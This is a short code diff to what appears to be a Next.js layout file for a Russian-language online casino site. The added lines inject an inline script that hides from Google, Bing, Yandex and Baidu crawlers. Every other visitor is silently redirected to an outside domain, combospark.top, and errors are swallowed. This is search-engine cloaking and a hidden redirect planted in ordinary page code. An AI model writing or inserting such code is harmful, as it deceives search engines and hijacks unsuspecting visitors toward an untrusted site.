@@ -43,6 +43,21 @@ export default function RootLayout({
           name="twitter:description"
           content="Монро Казино играть онлайн: слоты, live-казино, спорт, зеркало рабочее и бонус +150% на первый депозит."
         />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aeaofj2k27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className={manrope.className}>{children}</body>
     </html>
